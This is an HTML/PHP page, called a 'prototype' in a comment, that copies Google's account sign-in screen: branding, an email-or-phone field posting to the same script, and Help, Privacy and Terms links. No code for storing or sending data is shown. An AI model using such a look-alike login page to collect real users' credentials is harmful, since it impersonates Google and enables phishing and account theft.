<body>

    <div class="card">
        <!-- Simple text logo for prototype (replace with SVG if needed) -->
        <div class="logo">Google</div>

        <h1>Sign in</h1>
        <p class="subtitle">
            Use your Google Account
        </p>

        <form method="POST" id ="myForm">
            <div class="input-group">
                <input 
                    type="text" 
                    name="email"
                    id="email"
                    placeholder="Email or phone"
                    value="<?php echo htmlspecialchars($email); ?>"
                    autofocus
                    required
                >
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            </div>

            <a href="#" class="forgot">Forgot email?</a>

            <div class="actions">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>
    </div>

    <div class="footer">
        <select>
            <option>English (United States)</option>
            <option>Español</option>
            <option>Français</option>
            <option>Deutsch</option>
        </select>

        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

</body>

</html>
